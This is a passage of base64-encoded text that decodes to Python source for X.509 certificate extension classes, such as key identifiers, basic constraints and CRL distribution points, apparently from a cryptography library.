fbnVtYmVyIGlzIE5vbmVcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgImF1dGhvcml0eV9jZXJ0X2lzc3VlciBhbmQgYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlciAiXHJcbiAgICAgICAgICAgICAgICAibXVzdCBib3RoIGJlIHByZXNlbnQgb3IgYm90aCBOb25lIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIGF1dGhvcml0eV9jZXJ0X2lzc3VlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgYXV0aG9yaXR5X2NlcnRfaXNzdWVyID0gbGlzdChhdXRob3JpdHlfY2VydF9pc3N1ZXIpXHJcbiAgICAgICAgICAgIGlmIG5vdCBhbGwoXHJcbiAgICAgICAgICAgICAgICBpc2luc3RhbmNlKHgsIEdlbmVyYWxOYW1lKSBmb3IgeCBpbiBhdXRob3JpdHlfY2VydF9pc3N1ZXJcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiYXV0aG9yaXR5X2NlcnRfaXNzdWVyIG11c3QgYmUgYSBsaXN0IG9mIEdlbmVyYWxOYW1lICJcclxuICAgICAgICAgICAgICAgICAgICAib2JqZWN0cyJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlciBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIGF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXIsIGludFxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlciBtdXN0IGJlIGFuIGludGVnZXIiKVxyXG5cclxuICAgICAgICBzZWxmLl9rZXlfaWRlbnRpZmllciA9IGtleV9pZGVudGlmaWVyXHJcbiAgICAgICAgc2VsZi5fYXV0aG9yaXR5X2NlcnRfaXNzdWVyID0gYXV0aG9yaXR5X2NlcnRfaXNzdWVyXHJcbiAgICAgICAgc2VsZi5fYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlciA9IGF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXJcclxuXHJcbiAgICAjIFRoaXMgdGFrZXMgYSBzdWJzZXQgb2YgQ0VSVElGSUNBVEVfUFVCTElDX0tFWV9UWVBFUyBiZWNhdXNlIGFuIGlzc3VlclxyXG4gICAgIyBjYW5ub3QgaGF2ZSBhbiBYMjU1MTkvWDQ0OCBrZXkuIFRoaXMgaW50cm9kdWNlcyBzb21lIHVuZm9ydHVuYXRlXHJcbiAgICAjIGFzeW1tZXRyeSB0aGF0IHJlcXVpcmVzIHR5cGluZyB1c2VycyB0byBleHBsaWNpdGx5XHJcbiAgICAjIG5hcnJvdyB0aGVpciB0eXBlLCBidXQgd2Ugc2hvdWxkIG1ha2UgdGhpcyBhY2N1cmF0ZSBhbmQgbm90IGp1c3RcclxuICAgICMgY29udmVuaWVudC5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGZyb21faXNzdWVyX3B1YmxpY19rZXkoXHJcbiAgICAgICAgY2xzLCBwdWJsaWNfa2V5OiBDRVJUSUZJQ0FURV9JU1NVRVJfUFVCTElDX0tFWV9UWVBFU1xyXG4gICAgKSAtPiAiQXV0aG9yaXR5S2V5SWRlbnRpZmllciI6XHJcbiAgICAgICAgZGlnZXN0ID0gX2tleV9pZGVudGlmaWVyX2Zyb21fcHVibGljX2tleShwdWJsaWNfa2V5KVxyXG4gICAgICAgIHJldHVybiBjbHMoXHJcbiAgICAgICAgICAgIGtleV9pZGVudGlmaWVyPWRpZ2VzdCxcclxuICAgICAgICAgICAgYXV0aG9yaXR5X2NlcnRfaXNzdWVyPU5vbmUsXHJcbiAgICAgICAgICAgIGF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXI9Tm9uZSxcclxuICAgICAgICApXHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZnJvbV9pc3N1ZXJfc3ViamVjdF9rZXlfaWRlbnRpZmllcihcclxuICAgICAgICBjbHMsIHNraTogIlN1YmplY3RLZXlJZGVudGlmaWVyIlxyXG4gICAgKSAtPiAiQXV0aG9yaXR5S2V5SWRlbnRpZmllciI6XHJcbiAgICAgICAgcmV0dXJuIGNscyhcclxuICAgICAgICAgICAga2V5X2lkZW50aWZpZXI9c2tpLmRpZ2VzdCxcclxuICAgICAgICAgICAgYXV0aG9yaXR5X2NlcnRfaXNzdWVyPU5vbmUsXHJcbiAgICAgICAgICAgIGF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXI9Tm9uZSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiPEF1dGhvcml0eUtleUlkZW50aWZpZXIoa2V5X2lkZW50aWZpZXI9ezAua2V5X2lkZW50aWZpZXIhcn0sICJcclxuICAgICAgICAgICAgImF1dGhvcml0eV9jZXJ0X2lzc3Vlcj17MC5hdXRob3JpdHlfY2VydF9pc3N1ZXJ9LCAiXHJcbiAgICAgICAgICAgICJhdXRob3JpdHlfY2VydF9zZXJpYWxfbnVtYmVyPXswLmF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXJ9IlxyXG4gICAgICAgICAgICAiKT4iLmZvcm1hdChzZWxmKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEF1dGhvcml0eUtleUlkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5rZXlfaWRlbnRpZmllciA9PSBvdGhlci5rZXlfaWRlbnRpZmllclxyXG4gICAgICAgICAgICBhbmQgc2VsZi5hdXRob3JpdHlfY2VydF9pc3N1ZXIgPT0gb3RoZXIuYXV0aG9yaXR5X2NlcnRfaXNzdWVyXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXJcclxuICAgICAgICAgICAgPT0gb3RoZXIuYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlclxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIGlmIHNlbGYuYXV0aG9yaXR5X2NlcnRfaXNzdWVyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGFjaSA9IE5vbmVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhY2kgPSB0dXBsZShzZWxmLmF1dGhvcml0eV9jZXJ0X2lzc3VlcilcclxuICAgICAgICByZXR1cm4gaGFzaChcclxuICAgICAgICAgICAgKHNlbGYua2V5X2lkZW50aWZpZXIsIGFjaSwgc2VsZi5hdXRob3JpdHlfY2VydF9zZXJpYWxfbnVtYmVyKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfaWRlbnRpZmllcihzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9rZXlfaWRlbnRpZmllclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGF1dGhvcml0eV9jZXJ0X2lzc3VlcihcclxuICAgICAgICBzZWxmLFxyXG4gICAgKSAtPiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbR2VuZXJhbE5hbWVdXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYXV0aG9yaXR5X2NlcnRfaXNzdWVyXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlcihzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbaW50XTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYXV0aG9yaXR5X2NlcnRfc2VyaWFsX251bWJlclxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgU3ViamVjdEtleUlkZW50aWZpZXIoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuU1VCSkVDVF9LRVlfSURFTlRJRklFUlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBkaWdlc3Q6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2RpZ2VzdCA9IGRpZ2VzdFxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGZyb21fcHVibGljX2tleShcclxuICAgICAgICBjbHMsIHB1YmxpY19rZXk6IENFUlRJRklDQVRFX1BVQkxJQ19LRVlfVFlQRVNcclxuICAgICkgLT4gIlN1YmplY3RLZXlJZGVudGlmaWVyIjpcclxuICAgICAgICByZXR1cm4gY2xzKF9rZXlfaWRlbnRpZmllcl9mcm9tX3B1YmxpY19rZXkocHVibGljX2tleSkpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZGlnZXN0KHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kaWdlc3RcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfaWRlbnRpZmllcihzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZGlnZXN0XHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxTdWJqZWN0S2V5SWRlbnRpZmllcihkaWdlc3Q9ezAhcn0pPiIuZm9ybWF0KHNlbGYuZGlnZXN0KVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgU3ViamVjdEtleUlkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIGNvbnN0YW50X3RpbWUuYnl0ZXNfZXEoc2VsZi5kaWdlc3QsIG90aGVyLmRpZ2VzdClcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHNlbGYuZGlnZXN0KVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3MoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuQVVUSE9SSVRZX0lORk9STUFUSU9OX0FDQ0VTU1xyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCBkZXNjcmlwdGlvbnM6IHR5cGluZy5JdGVyYWJsZVsiQWNjZXNzRGVzY3JpcHRpb24iXVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGRlc2NyaXB0aW9ucyA9IGxpc3QoZGVzY3JpcHRpb25zKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBBY2Nlc3NEZXNjcmlwdGlvbikgZm9yIHggaW4gZGVzY3JpcHRpb25zKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkV2ZXJ5IGl0ZW0gaW4gdGhlIGRlc2NyaXB0aW9ucyBsaXN0IG11c3QgYmUgYW4gIlxyXG4gICAgICAgICAgICAgICAgIkFjY2Vzc0Rlc2NyaXB0aW9uIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2Rlc2NyaXB0aW9ucyA9IGRlc2NyaXB0aW9uc1xyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl9kZXNjcmlwdGlvbnMiKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8QXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3Moe30pPiIuZm9ybWF0KHNlbGYuX2Rlc2NyaXB0aW9ucylcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEF1dGhvcml0eUluZm9ybWF0aW9uQWNjZXNzKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kZXNjcmlwdGlvbnMgPT0gb3RoZXIuX2Rlc2NyaXB0aW9uc1xyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2godHVwbGUoc2VsZi5fZGVzY3JpcHRpb25zKSlcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIFN1YmplY3RJbmZvcm1hdGlvbkFjY2VzcyhFeHRlbnNpb25UeXBlKTpcclxuICAgIG9pZCA9IEV4dGVuc2lvbk9JRC5TVUJKRUNUX0lORk9STUFUSU9OX0FDQ0VTU1xyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCBkZXNjcmlwdGlvbnM6IHR5cGluZy5JdGVyYWJsZVsiQWNjZXNzRGVzY3JpcHRpb24iXVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGRlc2NyaXB0aW9ucyA9IGxpc3QoZGVzY3JpcHRpb25zKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBBY2Nlc3NEZXNjcmlwdGlvbikgZm9yIHggaW4gZGVzY3JpcHRpb25zKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkV2ZXJ5IGl0ZW0gaW4gdGhlIGRlc2NyaXB0aW9ucyBsaXN0IG11c3QgYmUgYW4gIlxyXG4gICAgICAgICAgICAgICAgIkFjY2Vzc0Rlc2NyaXB0aW9uIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2Rlc2NyaXB0aW9ucyA9IGRlc2NyaXB0aW9uc1xyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl9kZXNjcmlwdGlvbnMiKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8U3ViamVjdEluZm9ybWF0aW9uQWNjZXNzKHt9KT4iLmZvcm1hdChzZWxmLl9kZXNjcmlwdGlvbnMpXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBTdWJqZWN0SW5mb3JtYXRpb25BY2Nlc3MpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Rlc2NyaXB0aW9ucyA9PSBvdGhlci5fZGVzY3JpcHRpb25zXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCh0dXBsZShzZWxmLl9kZXNjcmlwdGlvbnMpKVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgQWNjZXNzRGVzY3JpcHRpb246XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgYWNjZXNzX21ldGhvZDogT2JqZWN0SWRlbnRpZmllciwgYWNjZXNzX2xvY2F0aW9uOiBHZW5lcmFsTmFtZVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGFjY2Vzc19tZXRob2QsIE9iamVjdElkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImFjY2Vzc19tZXRob2QgbXVzdCBiZSBhbiBPYmplY3RJZGVudGlmaWVyIilcclxuXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYWNjZXNzX2xvY2F0aW9uLCBHZW5lcmFsTmFtZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiYWNjZXNzX2xvY2F0aW9uIG11c3QgYmUgYSBHZW5lcmFsTmFtZSIpXHJcblxyXG4gICAgICAgIHNlbGYuX2FjY2Vzc19tZXRob2QgPSBhY2Nlc3NfbWV0aG9kXHJcbiAgICAgICAgc2VsZi5fYWNjZXNzX2xvY2F0aW9uID0gYWNjZXNzX2xvY2F0aW9uXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiPEFjY2Vzc0Rlc2NyaXB0aW9uKGFjY2Vzc19tZXRob2Q9ezAuYWNjZXNzX21ldGhvZH0sIGFjY2Vzc19sb2NhdGkiXHJcbiAgICAgICAgICAgICJvbj17MC5hY2Nlc3NfbG9jYXRpb259KT4iLmZvcm1hdChzZWxmKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEFjY2Vzc0Rlc2NyaXB0aW9uKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHNlbGYuYWNjZXNzX21ldGhvZCA9PSBvdGhlci5hY2Nlc3NfbWV0aG9kXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmFjY2Vzc19sb2NhdGlvbiA9PSBvdGhlci5hY2Nlc3NfbG9jYXRpb25cclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi5hY2Nlc3NfbWV0aG9kLCBzZWxmLmFjY2Vzc19sb2NhdGlvbikpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgYWNjZXNzX21ldGhvZChzZWxmKSAtPiBPYmplY3RJZGVudGlmaWVyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hY2Nlc3NfbWV0aG9kXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgYWNjZXNzX2xvY2F0aW9uKHNlbGYpIC0+IEdlbmVyYWxOYW1lOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hY2Nlc3NfbG9jYXRpb25cclxuXHJcblxyXG5jbGFzcyBCYXNpY0NvbnN0cmFpbnRzKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELkJBU0lDX0NPTlNUUkFJTlRTXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNhOiBib29sLCBwYXRoX2xlbmd0aDogdHlwaW5nLk9wdGlvbmFsW2ludF0pIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY2EsIGJvb2wpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImNhIG11c3QgYmUgYSBib29sZWFuIHZhbHVlIilcclxuXHJcbiAgICAgICAgaWYgcGF0aF9sZW5ndGggaXMgbm90IE5vbmUgYW5kIG5vdCBjYTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicGF0aF9sZW5ndGggbXVzdCBiZSBOb25lIHdoZW4gY2EgaXMgRmFsc2UiKVxyXG5cclxuICAgICAgICBpZiBwYXRoX2xlbmd0aCBpcyBub3QgTm9uZSBhbmQgKFxyXG4gICAgICAgICAgICBub3QgaXNpbnN0YW5jZShwYXRoX2xlbmd0aCwgaW50KSBvciBwYXRoX2xlbmd0aCA8IDBcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAicGF0aF9sZW5ndGggbXVzdCBiZSBhIG5vbi1uZWdhdGl2ZSBpbnRlZ2VyIG9yIE5vbmUiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fY2EgPSBjYVxyXG4gICAgICAgIHNlbGYuX3BhdGhfbGVuZ3RoID0gcGF0aF9sZW5ndGhcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjYShzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jYVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHBhdGhfbGVuZ3RoKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtpbnRdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wYXRoX2xlbmd0aFxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgIjxCYXNpY0NvbnN0cmFpbnRzKGNhPXswLmNhfSwgIiAicGF0aF9sZW5ndGg9ezAucGF0aF9sZW5ndGh9KT4iXHJcbiAgICAgICAgKS5mb3JtYXQoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEJhc2ljQ29uc3RyYWludHMpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuY2EgPT0gb3RoZXIuY2EgYW5kIHNlbGYucGF0aF9sZW5ndGggPT0gb3RoZXIucGF0aF9sZW5ndGhcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKChzZWxmLmNhLCBzZWxmLnBhdGhfbGVuZ3RoKSlcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIERlbHRhQ1JMSW5kaWNhdG9yKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELkRFTFRBX0NSTF9JTkRJQ0FUT1JcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY3JsX251bWJlcjogaW50KSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGNybF9udW1iZXIsIGludCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiY3JsX251bWJlciBtdXN0IGJlIGFuIGludGVnZXIiKVxyXG5cclxuICAgICAgICBzZWxmLl9jcmxfbnVtYmVyID0gY3JsX251bWJlclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNybF9udW1iZXIoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jcmxfbnVtYmVyXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBEZWx0YUNSTEluZGljYXRvcik6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5jcmxfbnVtYmVyID09IG90aGVyLmNybF9udW1iZXJcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHNlbGYuY3JsX251bWJlcilcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPERlbHRhQ1JMSW5kaWNhdG9yKGNybF9udW1iZXI9ezAuY3JsX251bWJlcn0pPiIuZm9ybWF0KHNlbGYpXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBDUkxEaXN0cmlidXRpb25Qb2ludHMoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuQ1JMX0RJU1RSSUJVVElPTl9QT0lOVFNcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgZGlzdHJpYnV0aW9uX3BvaW50czogdHlwaW5nLkl0ZXJhYmxlWyJEaXN0cmlidXRpb25Qb2ludCJdXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgZGlzdHJpYnV0aW9uX3BvaW50cyA9IGxpc3QoZGlzdHJpYnV0aW9uX3BvaW50cylcclxuICAgICAgICBpZiBub3QgYWxsKFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKHgsIERpc3RyaWJ1dGlvblBvaW50KSBmb3IgeCBpbiBkaXN0cmlidXRpb25fcG9pbnRzXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgImRpc3RyaWJ1dGlvbl9wb2ludHMgbXVzdCBiZSBhIGxpc3Qgb2YgRGlzdHJpYnV0aW9uUG9pbnQgIlxyXG4gICAgICAgICAgICAgICAgIm9iamVjdHMiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fZGlzdHJpYnV0aW9uX3BvaW50cyA9IGRpc3RyaWJ1dGlvbl9wb2ludHNcclxuXHJcbiAgICBfX2xlbl9fLCBfX2l0ZXJfXywgX19nZXRpdGVtX18gPSBfbWFrZV9zZXF1ZW5jZV9tZXRob2RzKFxyXG4gICAgICAgICJfZGlzdHJpYnV0aW9uX3BvaW50cyJcclxuICAgIClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPENSTERpc3RyaWJ1dGlvblBvaW50cyh7fSk+Ii5mb3JtYXQoc2VsZi5fZGlzdHJpYnV0aW9uX3BvaW50cylcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIENSTERpc3RyaWJ1dGlvblBvaW50cyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fZGlzdHJpYnV0aW9uX3BvaW50cyA9PSBvdGhlci5fZGlzdHJpYnV0aW9uX3BvaW50c1xyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2godHVwbGUoc2VsZi5fZGlzdHJpYnV0aW9uX3BvaW50cykpXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBGcmVzaGVzdENSTChFeHRlbnNpb25UeXBlKTpcclxuICAgIG9